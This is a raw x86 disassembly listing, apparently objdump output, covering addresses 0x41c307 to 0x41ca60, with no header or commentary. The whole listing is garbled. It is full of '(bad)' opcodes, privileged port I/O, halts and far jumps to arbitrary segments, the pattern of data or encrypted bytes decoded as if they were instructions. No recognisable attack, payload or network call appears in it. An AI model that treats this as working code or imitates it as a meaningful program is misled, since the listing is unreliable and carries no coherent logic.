  41c307:	sub    ch,BYTE PTR [ebx+0x55]
  41c30a:	(bad)  
  41c30b:	div    BYTE PTR [ebx]
  41c30d:	jae    0x41c37d
  41c30f:	and    al,dh
  41c311:	jg     0x41c2ba
  41c313:	xchg   esi,eax
  41c314:	mov    edx,0x5cc65cbb
  41c319:	sub    ah,BYTE PTR [eax]
  41c31b:	cwde   
  41c31c:	ds inc edi
  41c31e:	or     ch,BYTE PTR [ebx+esi*8]
  41c321:	mov    dh,0x56
  41c323:	repz cmp al,0x85
  41c326:	lods   eax,DWORD PTR ds:[esi]
  41c327:	scas   al,BYTE PTR es:[edi]
  41c328:	mov    bl,0x4f
  41c32a:	hlt    
  41c32b:	jg     0x41c2f3
  41c32d:	ins    BYTE PTR es:[edi],dx
  41c32e:	push   edx
  41c32f:	and    edx,DWORD PTR [ecx-0x65]
  41c332:	add    BYTE PTR [edi-0x5],dh
  41c335:	test   DWORD PTR [ebx+0x67],ebp
  41c338:	add    bl,bl
  41c33a:	test   BYTE PTR [ebx],0x76
  41c33d:	bound  edi,QWORD PTR [edx-0x74]
  41c340:	mov    es,eax
  41c342:	adc    BYTE PTR [edx+0x3d],dl
  41c345:	xor    al,dh
  41c347:	test   DWORD PTR [eax+eiz*2+0x27cc4a22],0x1619d4b6
  41c352:	popa   
  41c353:	daa    
  41c354:	dec    edi
  41c355:	inc    DWORD PTR [ecx-0x38f7fa54]
  41c35b:	(bad)  
  41c35c:	cwde   
  41c35d:	data16 sub al,0x51
  41c360:	cmp    edx,ecx
  41c362:	xlat   BYTE PTR ds:[ebx]
  41c363:	or     eax,0xa6e8f285
  41c368:	push   ebx
  41c369:	add    edx,0x59
  41c36c:	mov    eax,ds:0x4a62a09d
  41c371:	jp     0x41c3ec
  41c373:	sbb    DWORD PTR [ecx],edi
  41c375:	add    al,0x42
  41c377:	out    0x57,al
  41c379:	lods   eax,DWORD PTR ds:[esi]
  41c37a:	pop    edi
  41c37b:	ja     0x41c363
  41c37d:	leave  
  41c37e:	push   cs
  41c37f:	sub    bh,bl
  41c381:	dec    esp
  41c382:	xchg   ebx,eax
  41c383:	sub    DWORD PTR [edx],ebp
  41c385:	aas    
  41c386:	and    eax,0x10a166eb
  41c38b:	pop    eax
  41c38c:	(bad)  
  41c38d:	jne    0x41c3ed
  41c38f:	out    dx,al
  41c390:	mov    cl,0x39
  41c392:	cld    
  41c393:	mov    eax,ds:0xadf1e725
  41c398:	(bad)  [edx]
  41c39a:	les    ecx,FWORD PTR [esi+0x7f]
  41c39d:	out    dx,eax
  41c39e:	mov    al,ah
  41c3a0:	repz mov al,ds:0xfe01a2a9
  41c3a6:	sub    al,0x6d
  41c3a8:	daa    
  41c3a9:	jecxz  0x41c330
  41c3ab:	fstp   QWORD PTR [eax]
  41c3ad:	lods   al,BYTE PTR ds:[esi]
  41c3ae:	out    0xe8,al
  41c3b0:	(bad)  
  41c3b1:	adc    esp,DWORD PTR [ebx-0xd]
  41c3b4:	adc    BYTE PTR [edi],bh
  41c3b6:	add    bl,BYTE PTR [edi]
  41c3b8:	ins    BYTE PTR es:[edi],dx
  41c3b9:	fdiv   DWORD PTR [edi+0x3c]
  41c3bc:	fisubr DWORD PTR [esi+esi*2+0x1f]
  41c3c0:	dec    edi
  41c3c1:	in     eax,0x76
  41c3c3:	ror    BYTE PTR [ebx+0x16],cl
  41c3c6:	fdivp  st(1),st
  41c3c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3c9:	inc    edx
  41c3ca:	inc    ebp
  41c3cb:	test   al,0xa7
  41c3cd:	repz pop edx
  41c3cf:	jl     0x41c373
  41c3d1:	inc    ebp
  41c3d2:	xchg   edi,eax
  41c3d3:	add    DWORD PTR [ebp+0xe1f5ab0],edi
  41c3d9:	cmp    al,0x49
  41c3db:	inc    ebx
  41c3dc:	out    0x53,al
  41c3de:	and    edi,eax
  41c3e0:	cmp    al,0xf3
  41c3e2:	test   BYTE PTR [edx],0x75
  41c3e5:	lods   eax,DWORD PTR ds:[esi]
  41c3e6:	adc    eax,0x43f759d9
  41c3eb:	nop
  41c3ec:	loope  0x41c3b1
  41c3ee:	or     BYTE PTR [ebx],ah
  41c3f0:	xlat   BYTE PTR ds:[ebx]
  41c3f1:	and    cl,BYTE PTR [ebp+edx*2-0x33]
  41c3f5:	cmp    BYTE PTR [ebx],ch
  41c3f7:	mov    bh,0x8e
  41c3f9:	sbb    al,0x32
  41c3fb:	sub    bl,BYTE PTR [edi+0xe4fb0fe]
  41c401:	cs fwait
  41c403:	pusha  
  41c404:	sub    eax,0xc436846e
  41c409:	imul   esp,edi,0x3e
  41c40c:	mov    ch,0x4
  41c40e:	mov    cl,0x79
  41c410:	jb     0x41c412
  41c412:	pop    eax
  41c413:	sbb    al,0x37
  41c415:	fbld   TBYTE PTR [edx+0x4b]
  41c418:	cmp    al,0xc0
  41c41a:	ins    BYTE PTR es:[edi],dx
  41c41b:	jne    0x41c3d4
  41c41d:	and    al,0x8c
  41c41f:	in     al,dx
  41c420:	xlat   BYTE PTR ds:[ebx]
  41c421:	pop    ebp
  41c422:	push   esi
  41c423:	push   eax
  41c424:	stos   BYTE PTR es:[edi],al
  41c425:	dec    ecx
  41c426:	ins    DWORD PTR es:[edi],dx
  41c427:	aaa    
  41c428:	(bad)  
  41c429:	lods   al,BYTE PTR ds:[esi]
  41c42a:	xchg   ecx,eax
  41c42b:	mov    ebp,0xe8a6dd5b
  41c430:	or     cl,ch
  41c432:	mov    edi,0xbb42ee83
  41c437:	nop
  41c438:	push   ecx
  41c439:	mov    al,0x2c
  41c43b:	xor    DWORD PTR [ebx-0x6217b79],edi
  41c441:	dec    ecx
  41c442:	div    DWORD PTR [ebp-0x18c5624a]
  41c448:	pop    eax
  41c449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c44a:	shr    DWORD PTR [ebx-0x666980c1],1
  41c450:	sbb    DWORD PTR [eax+eax*1+0x646b4ec2],eax
  41c457:	push   esi
  41c458:	test   ah,0xc
  41c45b:	mov    ch,0x74
  41c45d:	xchg   DWORD PTR [ebx-0x6d8f9a3a],esp
  41c463:	inc    esp
  41c464:	inc    edi
  41c465:	call   0x8039:0xa2b7df32
  41c46c:	ja     0x41c4a0
  41c46e:	sbb    cl,BYTE PTR [ebx+esi*2+0x74]
  41c472:	push   esi
  41c473:	push   esi
  41c474:	inc    edx
  41c475:	xchg   ebx,eax
  41c476:	cmp    edi,DWORD PTR [ebp+0x56963af6]
  41c47c:	add    BYTE PTR [eax],0x5d
  41c47f:	outs   dx,DWORD PTR ds:[esi]
  41c480:	and    DWORD PTR [eax],ebx
  41c482:	int    0xb5
	...
  41c490:	add    BYTE PTR [edi+ecx*2+0x53ff531c],dh
  41c497:	(bad)  
  41c498:	out    dx,eax
  41c499:	inc    esi
  41c49a:	dec    esp
  41c49b:	add    eax,0xad267e32
  41c4a0:	sub    eax,0x14113
  41c4a5:	stos   DWORD PTR es:[edi],eax
  41c4a6:	add    eax,DWORD PTR [eax]
  41c4a8:	add    ch,cl
  41c4aa:	mov    dh,0x73
  41c4ac:	aas    
  41c4ad:	sbb    eax,0x7bbc6bde
  41c4b2:	enter  0x290b,0x5f
  41c4b6:	fnstsw WORD PTR [ebx-0xf9caf2d]
  41c4bc:	or     cl,BYTE PTR [edi-0x7e]
  41c4bf:	mov    edi,0xa3b15bbb
  41c4c4:	adc    dl,BYTE PTR [edi]
  41c4c6:	mov    WORD PTR [ebp+0x58],ds
  41c4c9:	xchg   esi,eax
  41c4ca:	fst    DWORD PTR fs:[eax]
  41c4cd:	cld    
  41c4ce:	hlt    
  41c4cf:	test   al,dh
  41c4d1:	lods   al,BYTE PTR ds:[esi]
  41c4d2:	push   ecx
  41c4d3:	aaa    
  41c4d4:	or     eax,0x8312f17f
  41c4d9:	jno    0x41c46c
  41c4db:	fs push ds
  41c4dd:	ret    0x70fa
  41c4e0:	jge    0x41c508
  41c4e2:	xchg   ebp,eax
  41c4e3:	jb     0x41c520
  41c4e5:	ret    
  41c4e6:	and    al,0x2a
  41c4e8:	in     eax,dx
  41c4e9:	mov    ds:0xd8c4f6b9,al
  41c4ee:	mov    ds:0x58cec2b7,eax
  41c4f3:	push   ss
  41c4f4:	xchg   BYTE PTR [ecx+ebx*1+0x6177d5e4],dl
  41c4fb:	adc    eax,DWORD PTR [edi]
  41c4fd:	inc    esi
  41c4fe:	ja     0x41c538
  41c500:	cmp    al,0x2b
  41c502:	push   ss
  41c503:	bound  ecx,QWORD PTR [ebp-0x2b]
  41c506:	or     al,0x25
  41c508:	mov    ah,0xd1
  41c50a:	fcomp  QWORD PTR [ecx+0x71]
  41c50d:	pop    ebx
  41c50e:	es retf 0x21f8
  41c512:	xor    al,0x72
  41c514:	ja     0x41c58f
  41c516:	leave  
  41c517:	gs sbb al,0x8f
  41c51a:	imul   ebp,DWORD PTR [edx],0x8bfa13dc
  41c520:	inc    ebp
  41c521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c522:	sbb    dh,ch
  41c524:	jno    0x41c56e
  41c526:	out    0x25,eax
  41c528:	addr16 loop 0x41c56e
  41c52b:	push   eax
  41c52c:	jecxz  0x41c520
  41c52e:	pandn  mm4,QWORD PTR [edi+0x5e]
  41c532:	iret   
  41c533:	ret    
  41c534:	int3   
  41c535:	aaa    
  41c536:	mov    ebx,0x341a1577
  41c53b:	aaa    
  41c53c:	dec    ecx
  41c53d:	(bad)  
  41c53e:	cwde   
  41c53f:	push   ecx
  41c540:	cmp    ebx,DWORD PTR [esi+0x19]
  41c543:	fs push esp
  41c545:	sub    cl,BYTE PTR [ebx-0x36]
  41c548:	xor    DWORD PTR [edi+ebx*8+0x252e9aa5],esi
  41c54f:	es jbe 0x41c545
  41c552:	jmp    0x41c57e
  41c554:	sbb    bl,cl
  41c556:	and    eax,0xf62ad2c1
  41c55b:	or     BYTE PTR [edi-0x66f7d79b],ah
  41c561:	ja     0x41c555
  41c563:	dec    ebx
  41c564:	inc    ebp
  41c565:	sub    edx,eax
  41c567:	div    BYTE PTR [ebp-0x3832f4fa]
  41c56d:	jae    0x41c553
  41c56f:	jbe    0x41c533
  41c571:	mov    esp,0x30424a9f
  41c576:	addr16 sbb eax,edx
  41c579:	es je  0x41c564
  41c57c:	xchg   ebp,eax
  41c57d:	lods   al,BYTE PTR ds:[esi]
  41c57e:	sbb    esp,DWORD PTR [ecx-0x3]
  41c581:	sub    al,0x8a
  41c583:	push   ebx
  41c584:	data16 jnp 0x41c5cc
  41c587:	pusha  
  41c588:	ja     0x41c539
  41c58a:	or     esi,DWORD PTR [ecx]
  41c58c:	xor    cl,al
  41c58e:	and    ebx,ecx
  41c590:	add    eax,0x5f72d4c7
  41c595:	sysexit 
  41c597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c598:	add    edi,DWORD PTR [edx-0x3ddfa953]
  41c59e:	int3   
  41c59f:	sub    al,0x22
  41c5a1:	or     cl,dl
  41c5a3:	sti    
  41c5a4:	mov    ecx,0x3edcaef
  41c5a9:	pop    ds
  41c5aa:	int3   
  41c5ab:	mov    eax,ebx
  41c5ad:	xor    DWORD PTR [ebx+0x1],0x40e8cb76
  41c5b4:	ins    DWORD PTR es:[edi],dx
  41c5b5:	test   cl,dl
  41c5b7:	or     bh,BYTE PTR [edi]
  41c5b9:	test   bl,0x5b
  41c5bc:	or     bh,BYTE PTR [edx+0x2d9f62a5]
  41c5c2:	xor    BYTE PTR [bp+di-0x59],ah
  41c5c6:	shl    DWORD PTR [edi],1
  41c5c8:	jo     0x41c5ea
  41c5ca:	cmp    DWORD PTR [edi-0x65],edi
  41c5cd:	in     al,0xe1
  41c5cf:	daa    
  41c5d0:	xor    dl,bl
  41c5d2:	mov    cl,0xbb
  41c5d4:	shl    eax,1
  41c5d6:	dec    esi
  41c5d7:	je     0x41c587
  41c5d9:	adc    eax,edi
  41c5db:	cld    
  41c5dc:	enter  0x794d,0x6d
  41c5e0:	lods   al,BYTE PTR ds:[esi]
  41c5e1:	lods   eax,DWORD PTR ds:[esi]
  41c5e2:	leave  
  41c5e3:	or     dl,BYTE PTR [eax]
  41c5e5:	push   eax
  41c5e6:	add    dh,al
  41c5e8:	fs lock mov eax,0x7c3d8320
  41c5ef:	retf   
  41c5f0:	inc    ebp
  41c5f1:	in     eax,dx
  41c5f2:	test   eax,0xcac6d8b6
  41c5f7:	xchg   BYTE PTR [esi+0x57],dh
  41c5fa:	and    bl,BYTE PTR [ebp-0xe]
  41c5fd:	inc    eax
  41c5fe:	jmp    0x6613:0xe21d7980
  41c605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c606:	jmp    FWORD PTR [edx+0xa]
  41c609:	pushf  
  41c60a:	das    
  41c60b:	cdq    
  41c60c:	ds cwde 
  41c60e:	neg    BYTE PTR [edx]
  41c610:	leave  
  41c611:	sahf   
  41c612:	sbb    al,0xb4
  41c614:	sub    edx,DWORD PTR [ecx-0x24b6994c]
  41c61a:	mov    BYTE PTR [eax],ch
  41c61c:	test   eax,0xb94fe16f
  41c621:	inc    esp
  41c622:	pop    ds
  41c623:	or     al,BYTE PTR [edi-0x2a4c59fd]
  41c629:	hlt    
  41c62a:	and    esp,DWORD PTR [eax-0x21]
  41c62d:	and    eax,0x838033dc
  41c632:	xchg   DWORD PTR [edi-0x13],edx
  41c635:	xor    eax,0x29f669df
  41c63a:	push   0xa3bfce7b
  41c63f:	pop    ss
  41c640:	loop   0x41c5ed
  41c642:	arpl   WORD PTR [eax],cx
  41c644:	aad    0x7d
  41c646:	outs   dx,DWORD PTR ds:[esi]
  41c647:	arpl   WORD PTR [ecx],ax
  41c649:	pop    edi
  41c64a:	mov    dl,0x7c
  41c64c:	shl    DWORD PTR es:[edx+esi*8],0xd
  41c651:	sahf   
  41c652:	into   
  41c653:	repz adc al,0xcf
  41c656:	pop    ebx
  41c657:	push   esp
  41c658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c659:	mov    bh,0xf4
  41c65b:	add    DWORD PTR [esp+edx*4+0xa],ebx
  41c65f:	adc    DWORD PTR [esi],0xffffffde
  41c662:	push   ds
  41c663:	loope  0x41c60b
  41c665:	push   0x9f3eb86e
  41c66a:	imul   esi,DWORD PTR [ebx-0x79],0x9
  41c66e:	sub    DWORD PTR [edi-0x3605a8ec],0x3c73c11e
  41c678:	add    al,0x17
  41c67a:	pop    esi
  41c67b:	push   eax
  41c67c:	jmp    0x8b57:0x91932250
  41c683:	popf   
  41c684:	lahf   
  41c685:	in     al,0x45
  41c687:	jno    0x41c645
  41c689:	aaa    
  41c68a:	(bad)  [eax]
  41c68c:	test   BYTE PTR [ebx-0x46097db7],dh
  41c692:	jno    0x41c62f
  41c694:	xchg   esi,eax
  41c695:	out    dx,eax
  41c696:	hlt    
  41c697:	inc    edx
  41c698:	mov    ah,BYTE PTR [ebx-0x300c4884]
  41c69e:	pusha  
  41c69f:	mov    bh,0x24
  41c6a1:	and    DWORD PTR [esi+0x55dee0bb],0xa8473cf4
  41c6ab:	lea    eax,es:[ecx-0x20]
  41c6af:	icebp  
  41c6b0:	dec    esp
  41c6b1:	dec    edx
  41c6b2:	out    dx,al
  41c6b3:	cdq    
  41c6b4:	push   ebp
  41c6b5:	shl    DWORD PTR [ebx],0xc0
  41c6b8:	cli    
  41c6b9:	push   0x3b5155f9
  41c6be:	and    DWORD PTR [ebx-0x76],esi
  41c6c1:	sti    
  41c6c2:	adc    eax,0xb1c68f30
  41c6c7:	sbb    al,0x7c
  41c6c9:	(bad)  
  41c6cb:	ret    0x6324
  41c6ce:	enter  0xb574,0x3b
  41c6d2:	aaa    
  41c6d3:	clc    
  41c6d4:	mov    bh,0xda
  41c6d6:	mov    ax,0xf188
  41c6da:	call   0xa44c0f65
  41c6df:	and    al,0x8c
  41c6e1:	ds jne 0x41c728
  41c6e4:	sar    DWORD PTR [edx],cl
  41c6e6:	mov    ?,eax
  41c6e8:	fcomip st,st(4)
  41c6ea:	clc    
  41c6eb:	mov    bh,0xd6
  41c6ed:	sbb    BYTE PTR [ecx-0x7b],bl
  41c6f0:	or     BYTE PTR [esi+0x6581f096],cl
  41c6f6:	(bad)  
  41c6f7:	mov    eax,ds:0x5027f071
  41c6fc:	sbb    bl,dh
  41c6fe:	sub    ch,dh
  41c700:	outs   dx,WORD PTR ds:[esi]
  41c702:	popf   
  41c703:	rep movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41c706:	xor    eax,0x6cf19d44
  41c70b:	call   0x52e541ea
  41c710:	add    dh,bl
  41c712:	inc    edx
  41c713:	jbe    0x41c71d
  41c715:	mov    DWORD PTR ds:0x91708929,esi
  41c71b:	stc    
  41c71c:	push   ss
  41c71d:	jne    0x41c70a
  41c71f:	sub    al,0x3c
  41c721:	stos   DWORD PTR es:[edi],eax
  41c722:	icebp  
  41c723:	lahf   
  41c724:	lds    eax,FWORD PTR [eax+esi*8]
  41c727:	cmc    
  41c728:	daa    
  41c729:	mov    eax,0x37a40990
  41c72e:	mov    edi,ebp
  41c730:	bound  ebx,QWORD PTR [edi+esi*8]
  41c733:	and    eax,0xb12e6cba
  41c738:	xor    eax,0x42345a
  41c73d:	ds mov ch,0xf4
  41c740:	test   esi,esi
  41c742:	or     esi,DWORD PTR [ecx]
  41c744:	or     edi,esi
  41c746:	rcr    BYTE PTR ds:[ecx-0x4aedcd9a],1
  41c74d:	push   ds
  41c74e:	push   ebx
  41c74f:	mov    ebx,0x5565fac3
  41c754:	shl    BYTE PTR [edx],0x30
  41c757:	xchg   edx,eax
  41c758:	popf   
  41c759:	sub    al,0x6e
  41c75b:	push   ds
  41c75c:	inc    edi
  41c75d:	sub    al,BYTE PTR [edx+0x4da1b96e]
  41c763:	push   esi
  41c764:	popf   
  41c765:	cli    
  41c766:	push   0xc4a52440
  41c76b:	bound  edx,QWORD PTR [ebp-0x7]
  41c76e:	cmp    eax,0xe0cfab01
  41c773:	(bad)  
  41c774:	ja     0x41c7bc
  41c776:	add    eax,0x3035b807
  41c77b:	(bad)  
  41c77c:	fldcw  WORD PTR [edx+0x3817a280]
  41c782:	push   edx
  41c783:	nop
  41c784:	mov    ebx,0x5de6dde1
  41c789:	cmp    esp,DWORD PTR [edx-0x7abb4c54]
  41c78f:	sbb    eax,0xae14130e
  41c794:	ins    BYTE PTR es:[edi],dx
  41c795:	or     esi,DWORD PTR [edx+0x29ef8d1]
  41c79b:	inc    ebx
  41c79c:	cmp    eax,0x78309527
  41c7a1:	inc    ebp
  41c7a2:	retf   
  41c7a3:	fcomp  QWORD PTR [esi-0x6b1c502c]
  41c7a9:	cdq    
  41c7aa:	dec    esi
  41c7ab:	jmp    0x41c811
  41c7ad:	pop    ecx
  41c7ae:	outs   dx,BYTE PTR ds:[esi]
  41c7af:	cli    
  41c7b0:	fst    QWORD PTR [ecx-0x66]
  41c7b3:	mov    ecx,0x31b25a4d
  41c7b8:	ja     0x41c746
  41c7ba:	jno    0x41c7ef
  41c7bc:	into   
  41c7bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7be:	jl     0x41c7b2
  41c7c0:	pop    ebx
  41c7c1:	dec    edx
  41c7c2:	les    ecx,FWORD PTR [ebp+0x7c]
  41c7c5:	dec    BYTE PTR [ebx+0x5e]
  41c7c8:	pop    esi
  41c7c9:	mov    cl,0x48
  41c7cb:	sahf   
  41c7cc:	jmp    ebx
  41c7ce:	pop    ebp
  41c7cf:	cmp    DWORD PTR [ebx+edx*1-0xcee9291],eax
  41c7d6:	repnz inc ecx
  41c7d8:	or     DWORD PTR [ebp+ebp*8-0x5c],esi
  41c7dc:	xchg   ecx,eax
  41c7dd:	dec    ebx
  41c7de:	(bad)  
  41c7df:	loopne 0x41c7c3
  41c7e1:	mov    edx,0x344c667d
  41c7e6:	ret    0xc333
  41c7e9:	xchg   BYTE PTR [ecx+0x6f],bh
  41c7ec:	daa    
  41c7ed:	jge    0x41c833
  41c7ef:	hlt    
  41c7f0:	sub    edx,esp
  41c7f2:	cwde   
  41c7f3:	outs   dx,BYTE PTR ds:[esi]
  41c7f4:	fcom   DWORD PTR [esi+0x7d]
  41c7f7:	inc    ecx
  41c7f8:	cmp    bl,BYTE PTR [esi-0x28062120]
  41c7fe:	adc    eax,DWORD PTR [ebp+0x3]
  41c801:	sbb    ecx,ebx
  41c803:	sub    eax,esi
  41c805:	lds    ecx,FWORD PTR [ebp+0x18379d31]
  41c80b:	out    dx,al
  41c80c:	and    eax,0xd0c19542
  41c811:	jg     0x41c801
  41c813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c814:	js     0x41c820
  41c816:	cmp    DWORD PTR [ecx+0x593a6f4b],edx
  41c81c:	cld    
  41c81d:	sbb    al,0x1a
  41c81f:	retf   0xad5e
  41c822:	shl    BYTE PTR [edx+0x29584190],0x3b
  41c829:	cdq    
  41c82a:	push   ds
  41c82b:	in     eax,dx
  41c82c:	pop    eax
  41c82d:	inc    ebp
  41c82e:	mov    cl,0xcc
  41c830:	and    DWORD PTR [ecx-0x37],esp
  41c833:	mov    esp,0x512f03a5
  41c838:	leave  
  41c839:	in     al,0x17
  41c83b:	into   
  41c83c:	add    BYTE PTR [edx-0x1b136838],ch
  41c842:	cmc    
  41c843:	hlt    
  41c844:	pop    ecx
  41c845:	cdq    
  41c846:	aaa    
  41c847:	xlat   BYTE PTR ds:[ebx]
  41c848:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c84a:	mov    eax,ds:0x4da164c5
  41c84f:	push   0x7c
  41c851:	enter  0x5c5b,0x0
	...
  41c861:	(bad)  
  41c862:	leave  
  41c863:	or     BYTE PTR [eax-0x12131ef3],ah
  41c869:	add    BYTE PTR [esi-0x1e],al
  41c86c:	or     edi,ecx
  41c86e:	add    edi,DWORD PTR [edx]
  41c870:	push   0xffffffbe
  41c872:	inc    esp
  41c873:	add    DWORD PTR [eax],eax
  41c875:	stos   DWORD PTR es:[edi],eax
  41c876:	add    eax,DWORD PTR [eax]
  41c878:	add    dh,bh
  41c87a:	dec    ebp
  41c87b:	ss pop edx
  41c87d:	sub    DWORD PTR [edx],eax
  41c87f:	stos   DWORD PTR es:[edi],eax
  41c880:	lea    esi,[eax]
  41c882:	retf   
  41c883:	ds out dx,al
  41c885:	inc    edi
  41c886:	mov    bl,0x51
  41c888:	mov    WORD PTR [edi+0xb],ss
  41c88b:	les    ecx,FWORD PTR [esi]
  41c88d:	mov    ch,0x7e
  41c88f:	fistp  QWORD PTR [ebp-0x2b]
  41c892:	frstor [edx+0x404bb6c2]
  41c898:	xchg   esi,eax
  41c899:	or     dh,BYTE PTR [eax]
  41c89b:	jmp    0x5fb8:0xbb1a5c50
  41c8a2:	int    0xde
  41c8a4:	inc    ebx
  41c8a5:	int3   
  41c8a6:	or     eax,DWORD PTR [ebp-0x2]
  41c8a9:	(bad)  
  41c8aa:	jb     0x41c8b0
  41c8ac:	or     DWORD PTR [ebp+0x38cea015],edx
  41c8b2:	push   0xf2bc00fc
  41c8b7:	xchg   ebx,eax
  41c8b8:	xor    eax,0xb2af8f5c
  41c8bd:	or     BYTE PTR [eax-0x30],al
  41c8c0:	sub    edx,esi
  41c8c2:	jge    0x41c8c9
  41c8c4:	out    dx,eax
  41c8c5:	mov    esi,DWORD PTR [eax-0x2f]
  41c8c8:	and    ebp,DWORD PTR [esi+0x7a024000]
  41c8ce:	popa   
  41c8cf:	fucomi st,st(4)
  41c8d1:	push   ds
  41c8d2:	fwait
  41c8d3:	or     bh,BYTE PTR [edi]
  41c8d5:	cli    
  41c8d6:	cmp    BYTE PTR [ebp+0x354370fb],dl
  41c8dc:	arpl   WORD PTR [edx+0x72],dx
  41c8df:	jmp    0x4106:0x6ba573bf
  41c8e6:	jg     0x41c8bf
  41c8e8:	mov    dh,BYTE PTR [eax-0x73f5f18e]
  41c8ee:	clc    
  41c8ef:	loopne 0x41c8f0
  41c8f1:	out    0x4d,eax
  41c8f3:	shl    BYTE PTR [ebx-0x1cb41f77],0xd7
  41c8fa:	daa    
  41c8fb:	and    DWORD PTR [ebx+0xa],eax
  41c8fe:	mov    WORD PTR [ebx+0x774b625d],ss
  41c904:	fdiv   st(6),st
  41c906:	mov    ch,0x7
  41c908:	adc    edi,DWORD PTR [ebx]
  41c90a:	stos   BYTE PTR es:[edi],al
  41c90b:	pop    ecx
  41c90c:	pop    ds
  41c90d:	jns    0x41c945
  41c90f:	imul   esi,DWORD PTR [ecx-0x2e],0xe4717aa6
  41c916:	in     al,0x54
  41c918:	add    esp,0xfffffff6
  41c91b:	or     al,0x97
  41c91d:	(bad)  
  41c91f:	or     dh,BYTE PTR [ecx]
  41c921:	xor    ebp,edx
  41c923:	(bad)
  41c926:	mov    ebp,ebx
  41c928:	jp     0x41c91b
  41c92a:	mov    edx,0x38561ac7
  41c92f:	mov    ecx,0x5502facf
  41c934:	dec    esi
  41c935:	xor    eax,0xd25e1828
  41c93a:	jl     0x41c8f5
  41c93c:	add    DWORD PTR [edi],ebx
  41c93e:	sbb    eax,0x1ae40226
  41c943:	test   DWORD PTR [ebx+0x6b],0x5a386934
  41c94a:	xchg   ebx,eax
  41c94b:	sbb    eax,0xbcb1c727
  41c950:	dec    ebp
  41c951:	xchg   DWORD PTR [eax+0x45],edi
  41c954:	jle    0x41c8dc
  41c956:	adc    al,0x77
  41c958:	retf   0xa58d
  41c95b:	add    eax,0xa3e24b73
  41c960:	ret    
  41c961:	xchg   ebp,eax
  41c962:	daa    
  41c963:	pop    ds
  41c964:	fbld   TBYTE PTR [edx-0x362766f6]
  41c96a:	xor    bl,BYTE PTR [eax]
  41c96c:	loop   0x41c94b
  41c96e:	jns    0x41c94e
  41c970:	(bad)  
  41c971:	jno    0x41c9e7
  41c973:	gs ja  0x41c91b
  41c976:	std    
  41c977:	(bad)  
  41c978:	push   eax
  41c979:	into   
  41c97a:	sti    
  41c97b:	inc    edi
  41c97c:	das    
  41c97d:	cmp    esi,DWORD PTR [ecx]
  41c97f:	push   edi
  41c980:	adc    eax,esp
  41c982:	xchg   esp,eax
  41c983:	mov    ebx,0xdb9a9b41
  41c988:	pop    esp
  41c989:	imul   esi,DWORD PTR [eax-0x33094fe],0x89e86b16
  41c993:	jmp    0x41c92f
  41c995:	push   esi
  41c996:	adc    esp,ecx
  41c998:	jae    0x41c990
  41c99a:	push   es
  41c99b:	ficomp DWORD PTR [edx-0x75]
  41c99e:	lods   al,BYTE PTR ds:[esi]
  41c99f:	inc    eax
  41c9a0:	dec    ebx
  41c9a1:	hlt    
  41c9a2:	and    ebp,DWORD PTR [edx+0x14]
  41c9a5:	cli    
  41c9a6:	mov    bl,0x44
  41c9a8:	les    esp,FWORD PTR [edi]
  41c9aa:	xchg   BYTE PTR [ecx+0xf],dh
  41c9ad:	stc    
  41c9ae:	xchg   bl,dl
  41c9b0:	fisttp WORD PTR [ebx]
  41c9b2:	push   es
  41c9b3:	pop    ebp
  41c9b4:	and    DWORD PTR ds:0xac4998e6,esp
  41c9ba:	inc    ebp
  41c9bb:	xor    dh,bh
  41c9bd:	jne    0x41c9e4
  41c9bf:	mov    ch,BYTE PTR [eax-0x6d]
  41c9c2:	inc    edx
  41c9c3:	ror    BYTE PTR [eax-0x76],cl
  41c9c6:	sub    eax,0x5251716e
  41c9cb:	jecxz  0x41c972
  41c9cd:	push   ecx
  41c9ce:	loopne 0x41ca1f
  41c9d0:	ret    
  41c9d1:	fist   WORD PTR [ebp+0x5fbb035e]
  41c9d7:	arpl   WORD PTR [eax],cx
  41c9d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9da:	pop    es
  41c9db:	(bad)  
  41c9dc:	(bad)  
  41c9dd:	mov    cl,ch
  41c9df:	(bad)  
  41c9e1:	xchg   edi,eax
  41c9e2:	je     0x41ca5c
  41c9e4:	jmp    0xf2529b1f
  41c9e9:	push   ss
  41c9ea:	and    eax,0x972c6840
  41c9ef:	push   ecx
  41c9f0:	loop   0x41ca31
  41c9f2:	and    al,BYTE PTR [ecx]
  41c9f4:	sbb    ch,BYTE PTR [edx-0xa]
  41c9f7:	ins    BYTE PTR es:[edi],dx
  41c9f8:	lea    edi,[ecx+eiz*1-0x73c1536c]
  41c9ff:	hlt    
  41ca00:	lds    eax,FWORD PTR [eax-0x56]
  41ca03:	das    
  41ca04:	mov    ds:0x16a13684,al
  41ca09:	jg     0x41c9f3
  41ca0b:	es inc edi
  41ca0d:	ret    
  41ca0e:	adc    BYTE PTR [ebx-0x4d],bl
  41ca11:	push   ecx
  41ca12:	lds    ebp,FWORD PTR [ecx+edi*2-0x715666c0]
  41ca19:	repnz or edx,ecx
  41ca1c:	rcl    BYTE PTR [ecx],1
  41ca1e:	xor    cl,BYTE PTR [esp+edi*4-0x1332597c]
  41ca25:	mov    ds:0x493ce43,al
  41ca2a:	fbstp  TBYTE PTR [edx+0x4400ca5d]
  41ca30:	add    eax,0xd320bff1
  41ca35:	into   
  41ca36:	aas    
  41ca37:	test   BYTE PTR [ebx+0x66dbb3f4],bl
  41ca3d:	daa    
  41ca3e:	jmp    0x41ca6a
  41ca40:	cmp    al,0x60
  41ca42:	and    DWORD PTR [edi-0x12],ecx
  41ca45:	jge    0x41ca87
  41ca47:	jmp    0x41caa7
  41ca49:	ds popa 
  41ca4b:	sbb    ebx,DWORD PTR [esi+0x220c2b6b]
  41ca51:	push   esp
  41ca52:	xor    eax,0x2624f687
  41ca57:	push   es
  41ca58:	arpl   WORD PTR [esi+0x33],cx
  41ca5b:	jne    0x41ca9c
  41ca5d:	sbb    BYTE PTR [ebp+0xb],cl
  41ca60:	mov    esi,0xde25f358
